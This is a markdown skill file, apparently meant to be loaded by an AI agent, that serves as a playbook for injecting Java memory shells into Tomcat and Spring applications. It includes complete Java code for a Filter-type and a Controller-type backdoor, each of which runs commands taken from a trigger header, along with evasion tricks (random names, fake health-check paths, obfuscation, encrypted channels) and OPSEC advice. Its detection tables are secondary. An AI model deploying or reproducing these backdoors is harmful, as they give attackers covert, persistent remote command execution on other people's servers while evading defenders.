---
name: java-memory-shell
description: >-
  Java memory shell (内存马) injection and evasion playbook. Covers Filter/Servlet/Listener injection for Tomcat, Spring Controller/Interceptor injection, Valve/Executor injection, Agent-based injection, and detection evasion techniques.
---

# SKILL: Java Memory Shell — Expert Injection & Evasion Playbook

> **AI LOAD INSTRUCTION**: Java memory shell techniques covering all major injection types (Filter, Servlet, Listener, Controller, Valve, Agent), detection avoidance, and tool usage. Base models often miss the distinction between different injection types and their detection characteristics.

## 0. RELATED ROUTING

- [evasion-comprehensive](../evasion-comprehensive/SKILL.md) for general evasion concepts
- [sandbox-escape-techniques](../sandbox-escape/SKILL.md) for JVM sandbox considerations
- [persistence-mechanisms](../../redteam-postex-detail-pack/references/persistence-mechanisms/SKILL.md) for persistence context

---

## 1. MEMORY SHELL TYPES

### 1.1 Type Decision Table

| Type | Container | Stealth | Detection Difficulty | Access Method |
|------|-----------|---------|---------------------|---------------|
| Filter | Tomcat/Jetty | Medium | URL pattern match | URL pattern |
| Servlet | Tomcat/Jetty | Medium | Web.xml/servlet mapping | URL path |
| Listener | Tomcat/Jetty | Low | Event listener enumeration | Request event |
| Controller | Spring | High | No file artifact | RequestMapping |
| Interceptor | Spring | High | Handler mapping check | URL pattern |
| Valve | Tomcat | High | Pipeline inspection | All requests |
| Executor | Tomcat NIO | Very High | Thread pool inspection | Callback |
| Agent | JVM-level | Very High | Java agent enumeration | Instrumentation |

---

## 2. INJECTION TECHNIQUES

### 2.1 Filter型内存马 (Most Common)

Injected into Tomcat's `FilterChain` via reflection:

```java
// Key steps:
// 1. Get StandardContext from current request
// 2. Create malicious Filter implementing javax.servlet.Filter
// 3. Register FilterDef and FilterMap in StandardContext
// 4. Add to FilterConfig

// Access: any URL matching the registered URL pattern
// Detection: FilterChain enumeration reveals unknown filters
```

### 2.2 Servlet型内存马

```java
// Inject via StandardContext.addServletMapping and Wrapper.addChild
// Requires: specific URL path registration
// Detection: servlet mapping enumeration
```

### 2.3 Listener型内存马

```java
// Register as ServletContextListener orServletRequestListener
// Fires on every request event
// Detection: listener enumeration in StandardContext
```

### 2.4 Spring Controller型内存马 (Recommended)

```java
// Inject via RequestMappingHandlerMapping.registerMapping
// Advantage: no web.xml artifact, uses Spring's annotation-based routing
// Detection: RequestMappingHandlerMapping.getHandlerMethods enumeration
```

### 2.5 Spring Interceptor型内存马

```java
// Inject via HandlerExecutionChain.addInterceptor
// Fires before/after controller methods
// Detection: interceptor list enumeration
```

### 2.6 Tomcat Valve型内存马

```java
// Inject via StandardContext.getPipeline().addValve()
// Advantage: runs before Filter chain, very early in request processing
// Detection: pipeline valve enumeration
```

### 2.7 Agent型内存马 (Most Stealthy)

```java
// Uses Java Instrumentation API to modify loaded classes at runtime
// Inject via VirtualMachine.loadAgent or attach to running JVM
// Advantage: no container-level registration, modifies bytecode directly
// Detection: check management-agent-status, Instrumentation.getAllLoadedClasses
```

---

## 3. INJECTION METHODS

### 3.1 Via Existing Webshell/RCE

When you already have code execution on the target:

```java
// Step 1: Get ServletContext
ServletContext servletContext = request.getServletContext();

// Step 2: Use reflection to get StandardContext
Field contextField = servletContext.getClass().getDeclaredField("context");
contextField.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) contextField.get(servletContext);
// ... continue reflection chain to StandardContext

// Step 3: Create and register malicious component
```

### 3.2 Via Deserialization

When deserialization RCE is available (Fastjson, Shiro, etc.):

```
Use gadget chain to call Runtime.exec or MethodInvoke
→ Execute bytecode that injects memory shell
→ Use ClassLoader.defineClass to load shell bytecode
```

### 3.3 Via JNDI/LDAP

```
1. Set up malicious LDAP server
2. Return Reference pointing to Factory class
3. Factory creates and registers memory shell
```

---

## 4. TOOLS

| Tool | Type | Features |
|------|------|----------|
| `behinder` (冰蝎) | Client | Filter/Servlet injection, encrypted communication |
| `godzilla` (哥斯拉) | Client | Filter/Servlet/Listener, custom encryption |
| `MemShell` | Generator | All types, anti-detection |
| `java-memshell-generator` | Generator | Customizable injection code |
| `tomcat-memshell` | Injector | Tomcat-specific, Valve/Filter |

---

## 5. DETECTION & EVASION

### 5.1 Detection Methods

```
# Java agent-based detection
Instrumentation.getAllLoadedClasses()  → check for suspicious class bytecode

# Tomcat-specific
StandardContext.getFilterDefs()        → enumerate registered filters
StandardContext.getServlets()          → enumerate servlets
StandardContext.getPipeline()          → check valves

# Spring-specific
RequestMappingHandlerMapping.getHandlerMethods()  → check mappings
AbstractHandlerMethodMapping.getHandlerMethods()

# Thread-based
Thread.getAllStackTraces()             → look for suspicious thread stacks
```

### 5.2 Evasion Techniques

- **Custom ClassLoader**: Load shell class via isolated ClassLoader to avoid standard enumeration
- **Dynamic Class Name**: Use random class names that mimic framework classes
- **Bytecode Obfuscation**: Use ASM/Javassist to generate obfuscated bytecode
- **No File Artifact**: Memory-only injection, no files written to disk
- **Encrypted Communication**: AES/XOR encrypted command channel
- **Sleep Mode**: Only activate on specific request patterns

---

## 6. OPSEC NOTES

- Memory shells survive until JVM restart — plan for persistence alternatives
- Agent-type shells are hardest to detect but require JVM attach permission
- Filter/Servlet type shells are easiest to inject but also easiest to detect
- Spring Controller type offers the best balance of stealth and functionality
- Always use encrypted communication channels to avoid network detection

---

## 7. Tomcat Filter 注入完整反射链（P0 补深）

> 补齐审计缺口：`StandardContext → FilterDef → FilterMap → FilterConfig` 完整反射链。

```java
// 完整实现：Tomcat Filter 型内存马反射链（StandardContext → FilterDef → FilterMap → FilterConfig）
// 触发头校验 + 命令执行 + 响应输出；注入后落地文件按自删纪律手动移除（不自动删）
public class TomcatFilterShell implements Filter {
    private static final String TRIGGER = "X-C";          // 触发头（会话可换）
    private static final String PREFIX  = "k_" + System.nanoTime();  // 随机名前缀避枚举

    @Override public void init(FilterConfig fc) {}
    @Override public void destroy() {}
    @Override public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest r = (HttpServletRequest) req;
        String cmd = r.getHeader(TRIGGER);
        if (cmd == null) { chain.doFilter(req, res); return; }   // 无触发头：透明放行
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            String out = new String(p.getInputStream().readAllBytes());
            out += new String(p.getErrorStream().readAllBytes());
            res.getWriter().write(out);                          // 回显
        } catch (Exception e) { /* 静默：异常不暴露马的存在 */ }
    }

    public static void inject(ServletContext servletContext) throws Exception {
        // 1) 从当前 request 拿 StandardContext（双字段反射链）
        Field appCtxField = servletContext.getClass().getDeclaredField("context");
        appCtxField.setAccessible(true);
        Object appCtx = appCtxField.get(servletContext);
        Field stdCtxField = appCtx.getClass().getDeclaredField("context");
        stdCtxField.setAccessible(true);
        org.apache.catalina.core.StandardContext stdCtx =
            (org.apache.catalina.core.StandardContext) stdCtxField.get(appCtx);

        // 2) 构造恶意 Filter（本类即实现 javax.servlet.Filter）
        TomcatFilterShell evil = new TomcatFilterShell();

        // 3) FilterDef 注册
        org.apache.tomcat.util.descriptor.web.FilterDef def =
            new org.apache.tomcat.util.descriptor.web.FilterDef();
        def.setFilterName(PREFIX);
        def.setFilterClass(evil.getClass().getName());
        def.setFilter(evil);
        stdCtx.addFilterDef(def);

        // 4) FilterMap（URL pattern 匹配）
        org.apache.tomcat.util.descriptor.web.FilterMap map =
            new org.apache.tomcat.util.descriptor.web.FilterMap();
        map.setFilterName(def.getFilterName());
        map.addURLPattern("/*");                              // 全路径触发
        map.setDispatcher(javax.servlet.DispatcherType.REQUEST.name());
        stdCtx.addFilterMapBefore(map);

        // 5) FilterConfig 入 chain（使 doFilter 生效）
        java.lang.reflect.Constructor<?> ctor =
            org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(
                org.apache.catalina.Context.class,
                org.apache.tomcat.util.descriptor.web.FilterDef.class);
        ctor.setAccessible(true);
        Object cfg = ctor.newInstance(stdCtx, def);
        Field configsField = org.apache.catalina.core.StandardContext.class
            .getDeclaredField("filterConfigs");
        configsField.setAccessible(true);
        java.util.Map<String, Object> configs =
            (java.util.Map<String, Object>) configsField.get(stdCtx);
        configs.put(def.getFilterName(), cfg);
    }
}
```

**检测侧**：`StandardContext.getFilterDefs()` 枚举出未在 web.xml 声明的 filter；filter 类名随机但
`getFilterConfigs()` 比对可得异常项。

## 8. Spring Controller 注入（registerMapping）

```java
// 完整实现：Spring MVC Controller 内存马（registerMapping，伪装路径 + 触发头校验）
public class SpringControllerShell {
    private static final String TRIGGER = "X-C";

    public static void inject(WebApplicationContext ctx) throws Exception {
        // 1) 从 Spring 容器拿 RequestMappingHandlerMapping
        RequestMappingHandlerMapping mapping = ctx.getBean(RequestMappingHandlerMapping.class);

        // 2) 构造恶意 handler 方法（反射注册）
        Method handlerMethod = SpringControllerShell.class
            .getDeclaredMethod("handle", HttpServletRequest.class);

        // 3) 构造 RequestMappingInfo（伪装路径：贴近真实业务命名，如 /api/health/metrics）
        RequestMappingInfo info = RequestMappingInfo.paths(
                "/api/health/" + Integer.toHexString(0x1000 + (int)(Math.random() * 0xFFF)))
            .methods(RequestMethod.GET, RequestMethod.POST).build();

        // 4) registerMapping 注册（HandlerMapping 内存中，无文件）
        mapping.registerMapping(info, new SpringControllerShell(), handlerMethod);
    }

    public String handle(HttpServletRequest request) throws Exception {
        String cmd = request.getHeader(TRIGGER);
        if (cmd == null) return "{\"status\":\"ok\"}";   // 无触发头：业务化响应
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            String out = new String(p.getInputStream().readAllBytes());
            out += new String(p.getErrorStream().readAllBytes());
            return new String(java.util.Base64.getEncoder().encode(out.getBytes()));
        } catch (Exception e) { return "{\"status\":\"ok\"}"; }  // 静默
    }
}
```

**检测侧**：`RequestMappingHandlerMapping.getHandlerMethods()` 枚举映射，比对「无源码/无注解」的异常
mapping；memory-shell-detector 思路即遍历 HandlerMapping + Filter/Servlet/Listener 全类型。

## 9. Godzilla / Behinder / suo5 协议（内存马版）

| 工具 | 内存马类型 | 通信加密 | 检测侧 |
|---|---|---|---|
| **冰蝎(Behinder)** | Filter/Servlet 注入 | AES（RSA 密钥协商） | 请求体高熵 + 协商特征 |
| **哥斯拉(Godzilla)** | Filter/Servlet/Listener | 自定义加密（AES/Raw XOR）+ 多生成器 | 生成器变体 + 加密流 |
| **suo5** | 全双工隧道型（非 HTTP 轮询） | 自定义协议 + 加密 | 长连接 + 非 HTTP 语义 |

> 三者均以「内存马 + 加密隧道」组合落地；协议细节与检测规则见 `webshell-evasion.md` §九。

## 10. memory-shell-detector 检测思路

```text
检测面（按来源 memory-shell-detector，审计 §5）：
1) Filter/Servlet/Listener 枚举：StandardContext.getFilterDefs/getServlets/getApplicationEventListeners
2) Spring 映射枚举：RequestMappingHandlerMapping.getHandlerMethods
3) Valve 枚举：StandardContext.getPipeline().getValves
4) 类加载器检查：可疑 ClassLoader / 无源 class 字节码
5) Agent 检查：Instrumentation.getAllLoadedClasses + 未在磁盘的 class
```

**对抗思路（配对）**：随机类名/方法名、自定义 ClassLoader 隔离、字节码混淆（ASM/Javassist）、
「仅在特定请求模式激活」的 sleep mode，使枚举/快照时机错过。

## 11. 检测侧总表（回馈 attack-defense）

| 内存马类型 | 检测点 | 判据 |
|---|---|---|
| Filter | getFilterDefs 异常项 | 未声明 filter + 随机类名 |
| Servlet | servlet mapping 异常 | 无 web.xml 声明的 mapping |
| Controller | getHandlerMethods 异常 | 无注解/源码的 mapping |
| Valve | pipeline valves 异常 | 非标准 valve |
| Agent | getAllLoadedClasses | 磁盘无对应的 class 字节码 |

## 12. 实测判据

| 判据 | 方法 |
|---|---|
| 内存马是否注入成功 | 请求匹配 pattern 触发 doFilter/controller |
| 是否被枚举发现 | memory-shell-detector / getHandlerMethods 比对 |
| 通信是否加密 | 抓包看请求/响应是否密文（高熵） |
